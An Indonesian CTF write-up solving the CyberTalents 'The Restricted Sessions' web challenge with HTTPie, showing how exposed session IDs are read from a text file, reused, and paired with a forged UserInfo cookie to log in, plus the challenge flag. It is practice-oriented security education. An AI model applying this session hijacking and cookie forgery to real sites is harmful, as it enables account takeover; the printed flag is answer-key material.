## [Writeup] Cyber Talents: The Restricted Sessions


Tutorial ini akan membahas solusi untuk soal CTF [Cyber Talents: The Restricted Sessions](https://cybertalents.com/challenges/web/the-restricted-sessions) yang masuk dalam kategori web security. Berikut ini adalah penjelasan untuk soal tersebut:

```
Flag is restricted to logged users only , can you be one of them.
```

Dan soalnya dapat ditemukan pada [tautan ini](http://34.77.37.110/restricted-sessions/). Kita akan menggunakan [HTTPie](https://httpie.org/) untuk menyelesaikan soal tersebut. Berikut ini adalah langkah-langkahnya:

* Buka tautan soal tersebut menggunakan httpie:

```bash
% http 'http://34.77.37.110/restricted-sessions/'
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Wed, 29 Jul 2020 11:21:31 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Sessions</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript">
      var cu = null;
    </script>
  </head>
  <body>

    <div class="container">
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are not logged-in so you don't have any flag to view</h2>
            <h3>Flag: NULL</h3>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>
```

* Bisa terlihat bahwa flagnya bernilai **NULL**, dan kita harus melakukan login untuk memperoleh flag. Perhatikan bagian akhir dari halaman tersebut, terdapat javascript berikut ini:

```javascript
<script type="text/javascript">

  if(document.cookie !== ''){
    $.post('getcurrentuserinfo.php',{
      'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
    },function(data){
      cu = data;
    });
  }
</script>
```

* Script tersebut akan memeriksa _Cookie_ yang dikirimkan, apakah memiliki nilai **PHPSESSID**. Maka selanjutnya kita akan mengirimkan cookie tersebut seperti ini:

```bash
% http "http://34.77.37.110/restricted-sessions/" "Cookie:PHPSESSID=admin"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Jul 2020 02:44:54 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

Session not found in data/session_store.txt
```

* Kali ini muncul pesan bahwa session yang kita gunakan tidak ditemukan pada file `data/session_store.txt`. Jadi kita akan melihat apa isi dari file tersebut dengan mengirimkan _request_ berikut ini:

```bash
% http "http://34.77.37.110/restricted-sessions/data/session_store.txt"
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 80
Content-Type: text/plain
Date: Thu, 30 Jul 2020 02:47:20 GMT
ETag: "59edfa97-50"
Last-Modified: Mon, 23 Oct 2017 14:20:07 GMT
Server: nginx/1.10.3 (Ubuntu)

iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```

* Ternyata terdapat tiga buah sesi pada file **session_store.txt**. Kita akan mencoba session pertama, yaitu **iuqwhe23eh23kej2hd2u3h2k23**. Berikut ini adalah request yang akan kita kirimkan:

```bash
% http "http://34.77.37.110/restricted-sessions/" "Cookie:PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Jul 2020 02:50:49 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

UserInfo Cookie don't have the username , Validation failed
```

* Kali ini, kita memerlukan _Cookie_ **UserInfo**. Perhatikan kembali javascript pada bagian awal tutorial ini. Pada javascript tersebut, bisa terlihat bahwa _Cookie_ **PHPSESSID** akan dikirimkan ke halaman **getcurrentuserinfo.php**. Kita akan mengirimkan request tersebut, seperti ini:

```bash
% http -f "http://34.77.37.110/restricted-sessions/getcurrentuserinfo.php" "PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23"
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: keep-alive
Content-Type: application/json
Date: Thu, 30 Jul 2020 02:49:59 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: PHPSESSID=90acf17lkegqor9tvgf9pdjs94; path=/
Transfer-Encoding: chunked

{
    "email": "john@example.com",
    "name": "john",
    "session_id": "iuqwhe23eh23kej2hd2u3h2k23"
}
```

* Bisa terlihat bahwa, _username_ untuk _session_ tersebut adalah **john**. Sekarang kita akan menambahkan informasi tersebut pada _Cookie_ dan mengirimkannya ke server seperti ini:

```bash
% http "http://34.77.37.110/restricted-sessions/" "Cookie:PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23; UserInfo=john"                                                                                                              [2/251]
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Jul 2020 02:58:02 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Sessions</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript">
      var cu = null;
    </script>
  </head>
  <body>

    <div class="container">
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are Loggedin</h2>
            <h3>Flag: sessionareawesomebutifitsecure</h3>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>
```

* Bisa terlihat bahwa kali ini kita berhasil login, dan memperoleh flagnya, yaitu `sessionareawesomebutifitsecure`

Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
